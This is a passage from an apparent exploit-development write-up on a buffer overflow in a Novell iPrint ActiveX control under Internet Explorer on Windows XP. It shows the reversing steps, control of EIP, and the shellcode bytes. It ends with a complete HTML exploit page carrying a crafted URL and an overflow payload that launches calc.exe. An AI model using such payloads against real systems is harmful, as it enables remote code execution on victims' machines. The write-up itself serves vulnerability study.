        data-src="/activex/debug_example_2.png"
        data-srcset="/activex/debug_example_2.png, /activex/debug_example_2.png 1.5x, /activex/debug_example_2.png 2x"
        data-sizes="auto"
        alt="/activex/debug_example_2.png"
        title="Debug example bp 2" /></p>
<p>As we can see, the parameters pushed on the stack are about the URL I specified in the <strong>PrinterUri</strong> field when calling the method. So, this URL will probably be checked by <strong>IppCreateServerRef</strong>. Let&rsquo;s hope no server requests will be made by this function.</p>
<p>Let&rsquo;s get back to IDA, <strong>we need this function to fail</strong> so we&rsquo;ll find a &ldquo;fail bloc&rdquo; and see how we can get there, it shouldn&rsquo;t be too hard.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/searching_fail_bloc.png"
        data-srcset="/activex/searching_fail_bloc.png, /activex/searching_fail_bloc.png 1.5x, /activex/searching_fail_bloc.png 2x"
        data-sizes="auto"
        alt="/activex/searching_fail_bloc.png"
        title="Searching fail bloc" /></p>
<p>The first jump is depending on a check made by an <strong>allocator</strong>, so it&rsquo;s about dynamic memory allocation and we don&rsquo;t <em>really</em> have an influence on it.</p>
<p>Though the second jump to the &ldquo;fail bloc&rdquo; depends on the <strong>sub_50022960</strong> function call: if it returns something different from <strong>0</strong> (so it must fail), then we get to the fail bloc.</p>
<p>Let&rsquo;s look onto <strong>sub_50022960</strong>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/searching_fail_bloc_2.png"
        data-srcset="/activex/searching_fail_bloc_2.png, /activex/searching_fail_bloc_2.png 1.5x, /activex/searching_fail_bloc_2.png 2x"
        data-sizes="auto"
        alt="/activex/searching_fail_bloc_2.png"
        title="Searching fail bloc" /></p>
<p>The first check here is about the whole URL length, this could have been interesting because it&rsquo;s an easy way to make the function fail, but the URL length is already checked in the .OCX file, so <strong>if we write more than 0x200 bytes, we&rsquo;ll never get to this function</strong>, remember?</p>
<p>By dynamically debugging in <strong>x64dbg</strong>, later we notice a very interesting check:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/searching_fail_bloc_3.png"
        data-srcset="/activex/searching_fail_bloc_3.png, /activex/searching_fail_bloc_3.png 1.5x, /activex/searching_fail_bloc_3.png 2x"
        data-sizes="auto"
        alt="/activex/searching_fail_bloc_3.png"
        title="Searching fail bloc" /></p>
<p>Here, the length of what preceeds &ldquo;://&rdquo; at the beginning is checked. Here I put &ldquo;testingipp&rdquo; as a test case, <strong>if this value length exceeds 0x100 bytes</strong>, then the <strong>function fails</strong>: that&rsquo;s perfect, we just need to write a <strong>long enough string</strong> preceeding &ldquo;://&rdquo; in our URL, <strong>without exceeding the URL total length of 0x200</strong>.</p>
<p>I feel you&rsquo;re a bit lost. Let&rsquo;s sum up so that we&rsquo;re on the same page.</p>
<div class="details admonition abstract open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-list-ul fa-fw" aria-hidden="true"></i>Elements we have at this point<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>So, if we remember well, we got everything we need to call the vulnerable function <strong>GetDriverSettings</strong>.</p>
<p>Here&rsquo;s a sum up of <strong>why this is possible without even emulating a server</strong> and making the function succeed:</p>
<ul>
<li>
<p>If <strong>sub_50022960</strong> (called in <strong>IppCreateServerRef</strong>) returns something different from 0, then <strong>IppCreateServerRef</strong> will return <strong>NULL</strong> (it will fail).</p>
<ul>
<li>This is possible by writing an URL prefix <strong>long enough to fail the check</strong> (&gt;0x100) but <strong>short enough to pass the first check in the .OCX file</strong> (&lt; 0x200).</li>
</ul>
</li>
<li>
<p>If <strong>IppCreateServerRef</strong> returns NULL (it will fail), then <strong>IppMgmtGetServerVersion2</strong> returns 0 (surprisingly, a success code). This is the logic bug we talked about.</p>
</li>
<li>
<p>If <strong>IppMgmtGetServerVersion2</strong> returns 0 (success code), then <strong>IppGetDriverSettings2</strong> is called. This is our initial condition to call the vulnerable code.</p>
</li>
</ul>
<p>It&rsquo;s simple as that.</p>
</div>
        </div>
    </div>
<p>Let&rsquo;s check all that now. We always need to test our theory to make sure we&rsquo;re on the right path. I wrote a random URL with a <strong>very long prefix</strong>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/random_url.png"
        data-srcset="/activex/random_url.png, /activex/random_url.png 1.5x, /activex/random_url.png 2x"
        data-sizes="auto"
        alt="/activex/random_url.png"
        title="Random URL long prefix" /></p>
<p>Again, if you remember well, we need to make the first part of the URL, before the &ldquo;://&rdquo; string, <strong>long enough to fail one of the checks</strong> in the DLL. It is our condition to bypass all the IPP server check cases and directly land on the vulnerable code.</p>
<p>We test our first exploitation of the logic bug, dynamically by placing a breakpoint on the <strong>IppGetDriverSettings2</strong> call and running the program with this payload.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/calling_vulnerable_code.png"
        data-srcset="/activex/calling_vulnerable_code.png, /activex/calling_vulnerable_code.png 1.5x, /activex/calling_vulnerable_code.png 2x"
        data-sizes="auto"
        alt="/activex/calling_vulnerable_code.png"
        title="calling_vulnerable_code" /></p>
<div class="details admonition success open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Success<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>We indeed <strong>get to the call as expected</strong>. Our bypass <strong>worked fine</strong>, we called the vulnerable function <strong>without emulating any server</strong>, by exploiting a <strong>programming logic bug</strong> which was caused by a <strong>bad handling of error cases</strong>.</p>
<p>Something that <strong>looks not really important</strong>, such as <strong>incorrectly handling an error status code</strong>, led us right to a <strong>critical function</strong>, which would have been <strong>very difficult</strong> otherwise, or even impossible.</p>
</div>
        </div>
    </div>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">I keep on insisting on this bypass, because in fact first I chose another path that I will explain at the end of this write-up, where I emulated an IPP server to reply to each request made by the client, to pass one by one each test: it was a waste of time because I didn&rsquo;t get anything successful from it and I quickly dropped this path, <strong>but it&rsquo;s worth talking about it</strong>: see <em>Other paths</em> section later.</div>
        </div>
    </div>
<p>To sum up the result: we finshed the first part of the exploitation, <strong>the vulnerable function is called</strong>.</p>
<p>Now let&rsquo;s reverse <strong>GetDriverSettings2</strong>.</p>
<p>According to what we read on internet, <strong>the vulnerable field is realm</strong>, this should create a buffer overflow, and we can guess that it occurs on one of the many <strong>strcpy</strong> function calls in this function.</p>
<p>But before even using this paramater, there&rsquo;s still a chance to end the function without getting to the vulnerable code:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/check_before_vuln_code.png"
        data-srcset="/activex/check_before_vuln_code.png, /activex/check_before_vuln_code.png 1.5x, /activex/check_before_vuln_code.png 2x"
        data-sizes="auto"
        alt="/activex/check_before_vuln_code.png"
        title="check_before_vuln_code" /></p>
<p>Indeed, if the URL does not contain the <strong>iPrint-driver-profile-hiddenPA</strong> string (checked by the <strong>strstr</strong>), the function ends. So we&rsquo;ll simply replace our <em>hello-world</em> string in URL by <em>iPrint-driver-profile-hiddenPA</em>. I didn&rsquo;t try to know why this specific string was needed, but as long as it passes the check and leads us to the vulnerable code, that&rsquo;s the matter.</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Sometimes, just like now, we&rsquo;ll choose to <strong>not waste our time</strong> in useless things by trying to understand elements that we don&rsquo;t need to understand in order to complete our exploitation.</p>
<p>We could probably look up why this function needs this specific string, and there is probably a good internal reason, but we don&rsquo;t really care: we have one goal in mind and it is to reach our vulnerable code to exploit it.</p>
<p>We cannot understand everything when reversing a big binary like that, so we choose to analyze <strong>only what is necessary</strong>.</p>
</div>
        </div>
    </div>
<p>Then, by searching for the actual vulnerability (we know it&rsquo;s a buffer overflow), this <strong>strcpy</strong> call that takes the <strong>realm</strong> parameter as source seems interesting.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/interesting_strcpy.png"
        data-srcset="/activex/interesting_strcpy.png, /activex/interesting_strcpy.png 1.5x, /activex/interesting_strcpy.png 2x"
        data-sizes="auto"
        alt="/activex/interesting_strcpy.png"
        title="interesting_strcpy" /></p>
<p>For the next exploitation section, I will try to make Internet Explorer crash by giving a <strong>long realm value</strong> (<strong>0x200 bytes</strong> which is the limit as we saw) and explore in <strong>x64dbg</strong> by dynamically debugging where did the crash occur.</p>
<p>We&rsquo;re done with <strong>reversing</strong> here (I actually did reverse it all, see the <em>Other paths</em> section), let&rsquo;s get to the <strong>exploitation part</strong>.</p>
<h2 id="4-exploitation">4. Exploitation</h2>
<p>In this part of the write-up, we&rsquo;ll debug the <strong>IppGetDriverSettings2</strong> function itself,
and try to provoke a <strong>buffer overflow</strong>, control the <strong>EIP register</strong> and pop a <strong>calc.exe</strong>.</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>For some reason, and being part of a driver, once the <strong>ActiveX controller</strong> crashes, <strong>it keeps crashing everytime I call it</strong>, so I need to reboot my Windows XP after each crash.</p>
<p>I did not fully understand what exactly caused this behaviour.</p>
<p>Also, <strong>to attach to the process</strong> I want to debug, <strong>I first must run it</strong>, so I will run Internet Explorer with a basic payload that will not crash the program (AAAA for example), then once the debugger is attached to the process, I&rsquo;ll open the real payload.</p>
</div>
        </div>
    </div>
<h3 id="41-control-eip">4.1. Control EIP</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/first_crash.png"
        data-srcset="/activex/first_crash.png, /activex/first_crash.png 1.5x, /activex/first_crash.png 2x"
        data-sizes="auto"
        alt="/activex/first_crash.png"
        title="First crash" /></p>
<p>We press the continue button (<strong>F9</strong>) on x64dbg to get to the crash and inspect the registers:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/inspect_registers.png"
        data-srcset="/activex/inspect_registers.png, /activex/inspect_registers.png 1.5x, /activex/inspect_registers.png 2x"
        data-sizes="auto"
        alt="/activex/inspect_registers.png"
        title="Inspect registers" /></p>
<p>The buffer overflow <strong>did indeed occur somewhere</strong>, but unfortunately the crash cause <strong>isn&rsquo;t the corruption of the EIP</strong> register that we need to control the execution flow.</p>
<p>It is the EBX register that is responsible, and the crash is probably happening <strong>inside a strlen function</strong> which received the <strong>0x41414141</strong> address (consequence of our many A&rsquo;s).</p>
<p>In such cases, we got two possibilites:</p>
<ul>
<li>
<p>Either we went <strong>too far</strong> by overflowing (in that case, we must try with a shorter payload)</p>
</li>
<li>
<p>Or <strong>not enough</strong> (there, we can try a longer payload and eventually <strong>fix it</strong> to avoid the crashes happening before the EIP crash by <strong>writing valid addresses instead of A&rsquo;s</strong>). This is a known method in exploitation: if your program crashes <strong>before</strong> reaching the saved EIP in stack, simply <strong>fix the crash</strong> by providing the program the minimum requirement to <strong>not crash</strong>: like a random <strong>valid address</strong>. You do not really care what it will do with it because you know you will <strong>take control of the execution flow</strong>.</p>
</li>
</ul>
<p>In our case, we&rsquo;re already limited by the checks in the .OCX file: <strong>we cannot go beyond 0x200 bytes</strong>.</p>
<p>So let&rsquo;s try with a shorter string:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/shorter_string.png"
        data-srcset="/activex/shorter_string.png, /activex/shorter_string.png 1.5x, /activex/shorter_string.png 2x"
        data-sizes="auto"
        alt="/activex/shorter_string.png"
        title="Shorter string" /></p>
<p>We <em>continue</em> and check the registers upon crash:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/correct_crash.png"
        data-srcset="/activex/correct_crash.png, /activex/correct_crash.png 1.5x, /activex/correct_crash.png 2x"
        data-sizes="auto"
        alt="/activex/correct_crash.png"
        title="Correct crash" /></p>
<div class="details admonition success open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Success<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>One of our A&rsquo;s bloc overflowed the <strong>saved EIP</strong> value in the stack, which was restored through the <strong>ret</strong> instruction: <strong>now we control the execution flow</strong>.</p>
<p>In cases where we don&rsquo;t know which bloc controls the EIP, we can just try to remove characters until we get to the limit, or simply use a <strong>cyclic payload</strong> string, like AAAABBBBCCCCDDDD etc.</p>
</div>
        </div>
    </div>
<p>The next steps are very simple, we&rsquo;re <strong>close to the end</strong>:</p>
<ul>
<li>Get a pop calc.exe <strong>shellcode</strong></li>
<li><strong>Write it</strong> in one of the fields (for example username) of the vulnerable function</li>
<li>Run Internet Explorer with a legitimate <strong>realm</strong> field so that it does not crash</li>
<li>Get the address of our shellcode</li>
<li>Without rebooting (so that the address remains the same), build another payload to provoke the overflow and <strong>set the EIP at the shellcode&rsquo;s address</strong></li>
<li>Call the new payload in Internet Explorer</li>
</ul>
<h3 id="42-get-a-shellcode">4.2. Get a shellcode</h3>
<p>Let&rsquo;s try it, I chose this shellcode (for <strong>Windows XP SP3 EN</strong>) from <a href="http://shell-storm.org/shellcode/files/shellcode-739.php" target="_blank" rel="noopener noreffer ">http://shell-storm.org/shellcode/files/shellcode-739.php</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"> <span class="err">&#34;\</span><span class="nf">x31</span><span class="err">\</span><span class="no">xC9</span><span class="err">&#34;</span>             <span class="c1">// xor ecx,ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">&#34;\</span><span class="nf">x51</span><span class="err">&#34;</span>                 <span class="c1">// push ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">&#34;\</span><span class="nf">x68</span><span class="err">\</span><span class="no">x63</span><span class="err">\</span><span class="no">x61</span><span class="err">\</span><span class="no">x6C</span><span class="err">\</span><span class="no">x63</span><span class="err">&#34;</span> <span class="c1">// push 0x636c6163
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">&#34;\</span><span class="nf">x54</span><span class="err">&#34;</span>                 <span class="c1">// push dword ptr esp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">&#34;\</span><span class="nf">xB8</span><span class="err">\</span><span class="no">xC7</span><span class="err">\</span><span class="no">x93</span><span class="err">\</span><span class="no">xC2</span><span class="err">\</span><span class="no">x77</span><span class="err">&#34;</span> <span class="c1">// mov eax,0x77c293c7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">&#34;\</span><span class="nf">xFF</span><span class="err">\</span><span class="no">xD0</span><span class="err">&#34;</span>             <span class="c1">// call eax
</span></span></span></code></pre></div><h3 id="43-store-the-shellcode-in-memory">4.3. Store the shellcode in memory</h3>
<p>We write it in the <strong>username</strong> field with <strong>xxd</strong> on linux (or any similar tool for manipulating binary data). Then we run the first payload just to get the address (it shouldn&rsquo;t crash here):</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/get_address_sc.png"
        data-srcset="/activex/get_address_sc.png, /activex/get_address_sc.png 1.5x, /activex/get_address_sc.png 2x"
        data-sizes="auto"
        alt="/activex/get_address_sc.png"
        title="Get SC address" /></p>
<p>As you can see, the <strong>realm</strong> field is not malicious here, nothing should trigger the vulnerable code.</p>
<h3 id="44-get-the-shellcodes-address">4.4. Get the shellcode&rsquo;s address</h3>
<p>Let&rsquo;s run Internet Explorer with this file and get the <strong>username</strong> field address by placing a <strong>breakpoint</strong> on the <strong>GetDriverSettings2</strong> call.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/get_sc_address.png"
        data-srcset="/activex/get_sc_address.png, /activex/get_sc_address.png 1.5x, /activex/get_sc_address.png 2x"
        data-sizes="auto"
        alt="/activex/get_sc_address.png"
        title="Get SC address" /></p>
<p>As we can see, the <strong>username</strong> address (<strong>3rd</strong> parameter in stack) is <strong>0x02843728</strong>, by dumping it we notice <strong>our shellcode there</strong>.</p>
<h3 id="45-jump-to-shellcode-and-win">4.5. Jump to shellcode and win</h3>
<p>Now, we&rsquo;ll modify the payload with which we control EIP to overflow with this address (instead of <strong>0x41414141</strong>) in order to jump to our shellcode.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/payload.png"
        data-srcset="/activex/payload.png, /activex/payload.png 1.5x, /activex/payload.png 2x"
        data-sizes="auto"
        alt="/activex/payload.png"
        title="Final payload" /></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ xxd -p -r payload &gt; win_payload.html
</span></span><span class="line"><span class="cl">$ cat win_payload.html
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">classid</span><span class="o">=</span><span class="s">&#39;clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;target&#39;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">object</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">target</span><span class="p">.</span><span class="nx">GetDriverSettings</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;RYKZkNPoYQhv8qEaKtHGXKYcfhPoKYD2MCci5hBV0vVux7J3t8PapWJnnGPPz
</span></span></span><span class="line"><span class="cl"><span class="s2">fbtsJ0fgr4jcfwU5GF8frhSWzRaiHUt2fIlTmEHJAR09JbK9Wwl22hxyIzwRdt8
</span></span></span><span class="line"><span class="cl"><span class="s2">NH6uXL3tZfQkAUrmzfle9Ni1q8dammfbi8YfAK90UPtB4LU0JYQMBbgmQbIgxvu
</span></span></span><span class="line"><span class="cl"><span class="s2">R1X9xxDtSNeqewZYlqf1JTi4FCNtjPT9zDyeg6PRvvPNxswm1Xac7YHOgGN1m9h
</span></span></span><span class="line"><span class="cl"><span class="s2">mSZ1dR://iprint-driver-profile-hiddenpa&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span class="line"><span class="cl"><span class="s2">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span class="line"><span class="cl"><span class="s2">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span class="line"><span class="cl"><span class="s2">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></span><span class="line"><span class="cl"><span class="s2">AAAAAAAAAAAAA(7ï¿½&#34;</span><span class="p">,</span> <span class="s2">&#34;1ï¿½QhcalcTï¿½Ç“ï¿½wï¿½ï¿½&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s try this now after detaching the debugger from the process.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/win.png"
        data-srcset="/activex/win.png, /activex/win.png 1.5x, /activex/win.png 2x"
        data-sizes="auto"
        alt="/activex/win.png"
        title="Win" /></p>
<div class="details admonition success open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Success<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>A calc.exe popped as expected, <strong>we won</strong>.</p>
<p><strong>In the next section</strong>, I&rsquo;ll explain the other paths I tried to take and that failed: it&rsquo;s still <strong>interesting to read</strong>.</p>
</div>
        </div>
    </div>
<h2 id="5-other-paths">5. Other paths</h2>
<p>Before getting to the result above, I tried some completely different things. For the first part of the reverse section (trying to figure out how to make a call to <strong>GetDriverSettings</strong>), <strong>I set up and emulated an IPP server</strong> to reply to each request from the server (so that <strong>IppMgmtGetServerVersion2</strong> does not fail), at this time <strong>I didn&rsquo;t notice the easy way of doing it</strong> (the logic bug, remember?).</p>
<p>The other different path I took was in the exploitation part, during the buffer overflow, <strong>I didn&rsquo;t write enough characters to overflow</strong> the EIP the way I explained in the write-up, but <strong>I did write enough to overflow the EIP through a modificated version of my entry</strong>: in fact, the <strong>realm</strong> string was sent to a <strong>bloc per bloc encryption function</strong> (the <strong>key was stored in the memory</strong> so I reversed it), which then produced a <strong>twice longer string</strong>: this produced a buffer overflow but <strong>I couldn&rsquo;t directly control EIP</strong> since what overflowed was the <strong>ciphertext and not the cleartext</strong>. Nonetheless, <strong>I managed to set EIP to 0x41414141</strong> this way, but I got no way to set a <strong>valid address</strong>, I&rsquo;ll explain this in the next parts.</p>
<p>I will only sum up each part and not get into deep details.</p>
<h3 id="51-the-ipp-server">5.1. The IPP Server</h3>
<p>First, let&rsquo;s talk about the emulation of the IPP server.</p>
<p>We get back to the reverse of the <strong>sub_5C04B514</strong> where I noticed the <strong>IppCreateServerRef</strong> check, and where I said:</p>
<blockquote>
<p>A lot of things seems to happen there, and there&rsquo;s probably where the <strong>IPP requests</strong> are being made. The first idea that comes is &ldquo;we need a server to reply to these requests&rdquo;. <strong>But</strong>, if we step back and consider each bloc as a mathematical equation and completely forget how it should work, <strong>some interesting paths shows up</strong>.</p>
</blockquote>
<p>For this part, <strong>I set up a server</strong> and assigned a domain name to it, let&rsquo;s say ipp-server-check.cf.</p>
<p>So I first only checked what kind of request was made by the client (which I guess was trying to reach <strong>port 631</strong>), I opened the <strong>631 port with nc</strong> and waited for the request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ nc -lvp <span class="m">631</span>
</span></span><span class="line"><span class="cl">Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port 631<span class="o">)</span> Connection from x.x.x.x <span class="m">35136</span> received!
</span></span><span class="line"><span class="cl">POST /ipp/IppSrvr HTTP/1.1
</span></span><span class="line"><span class="cl">Accept: application/ipp
</span></span><span class="line"><span class="cl">Accept-Charset: UTF-8,ISO-8859-1 Accept-Language: en-us, en
</span></span><span class="line"><span class="cl">User-Agent: Novell iPrint Client - v05.74.00 Cache-Control: no-cache
</span></span><span class="line"><span class="cl">Pragma: no-cache
</span></span><span class="line"><span class="cl">Host: iprint.local-intranet-do.cf:631 Content-type: application/ipp
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Content-length: <span class="m">112</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@Gattributes-charsetutf-8Httributes-natural-languageen-usDoperation-nameget-serv er-versionserver-version1.1
</span></span></code></pre></div><p>So I guessed that the <strong>POST</strong> request on <strong>/ipp/IppSrvr</strong> must succeed.</p>
<p>By reversing the <strong>IppMgmtGetServerVersion2</strong> function, I noticed three important function calls.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/ippserver1.png"
        data-srcset="/activex/ippserver1.png, /activex/ippserver1.png 1.5x, /activex/ippserver1.png 2x"
        data-sizes="auto"
        alt="/activex/ippserver1.png"
        title="IPP Server 1" /></p>
<p>Without getting into details, the first function made the actual network request, <strong>the second function is a huge set of tests</strong> about the answer from the server, and the third function makes additionnals checks and is called if the second function fails.</p>
<p>What is important here is the second function call <strong>nipplib.5C0450B3</strong>.</p>
<p>As I previously mentioned I didn&rsquo;t get to the end of this, because I dropped this way, but here is what I got from reversing this function:</p>
<ul>
<li>
<p>A first check is performed on the <strong>version-number</strong> returned by the server, it reads the first bytes
of the request body to get this number: <img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/check1.png"
        data-srcset="/activex/check1.png, /activex/check1.png 1.5x, /activex/check1.png 2x"
        data-sizes="auto"
        alt="/activex/check1.png"
        title="Check 1 IPP Server" /></p>
<ul>
<li>To pass the test, <strong>we can simply specify 0x100 or 0x101</strong> at the beginning of the request body.</li>
</ul>
</li>
<li>
<p>Then, the <strong>validity of the response IPP header</strong> is being checked</p>
<ul>
<li>For this part, I simply set up a <strong>CUPS server</strong>, waited for a request, and checked what CUPS replied to the client (of course, it wasn&rsquo;t a valid response but <strong>the header was OK</strong> so I used it)</li>
</ul>
</li>
<li>
<p>Then, it required the presence of the <strong>server-version</strong> attribute in the attribute group through the <strong>IppFindAttributeInSet</strong> function which simply <strong>lists all attributes received</strong> and <strong>compares them</strong> to the specified value, here it is <strong>server-version</strong>.</p>
<ul>
<li>To pass the test, I read the <a href="https://datatracker.ietf.org/doc/html/rfc8010" target="_blank" rel="noopener noreffer "><strong>RFC 8010 - IPP/1.1: Encoding and Transport</strong></a> document, especially these parts:</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Text" data-lang="Text"><span class="line"><span class="cl">3.1.  Picture of the Encoding
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3.1.1.  Request and Response
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   An operation request or response is encoded as follows:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |                  version-number             |   2 bytes  - required
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |               operation-id (request)        |
</span></span><span class="line"><span class="cl">   |                      or                     |   2 bytes  - required
</span></span><span class="line"><span class="cl">   |               status-code (response)        |
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |                   request-id                |   4 bytes  - required
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |                 attribute-group             |   n bytes - 0 or more
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |              end-of-attributes-tag          |   1 byte   - required
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |                     data                    |   q bytes  - optional
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                       Figure 1: IPP Message Format
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   The first three fields in the above diagram contain the value of
</span></span><span class="line"><span class="cl">   attributes described in Section 4.1.1 of the Model and Semantics
</span></span><span class="line"><span class="cl">   document [RFC8011].
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   The fourth field is the &#34;attribute-group&#34; field, and it occurs 0 or
</span></span><span class="line"><span class="cl">   more times.  Each &#34;attribute-group&#34; field represents a single group
</span></span><span class="line"><span class="cl">   of attributes, such as an Operation Attributes group or a Job
</span></span><span class="line"><span class="cl">   Attributes group (see the Model).  The Model specifies the required
</span></span><span class="line"><span class="cl">   attribute groups and their order for each operation request and
</span></span><span class="line"><span class="cl">   response.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   The &#34;end-of-attributes-tag&#34; field is always present, even when the
</span></span><span class="line"><span class="cl">   &#34;data&#34; is not present.  The Model specifies whether the &#34;data&#34; field
</span></span><span class="line"><span class="cl">   is present for each operation request and response.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   3.1.2.  Attribute Group
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Each &#34;attribute-group&#34; field is encoded as follows:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   -----------------------------------------------
</span></span><span class="line"><span class="cl">   |           begin-attribute-group-tag         |  1 byte
</span></span><span class="line"><span class="cl">   ----------------------------------------------------------
</span></span><span class="line"><span class="cl">   |                   attribute                 |  p bytes |- 0 or more
</span></span><span class="line"><span class="cl">   ----------------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    Figure 2: Attribute Group Encoding
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   An &#34;attribute-group&#34; field contains zero or more &#34;attribute&#34; fields.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Note that the values of the &#34;begin-attribute-group-tag&#34; field and the
</span></span><span class="line"><span class="cl">   &#34;end-of-attributes-tag&#34; field are called &#34;delimiter-tags&#34;.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   3.1.3.  Attribute
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   An &#34;attribute&#34; field is encoded as follows:
</span></span><span class="line"><span class="cl">
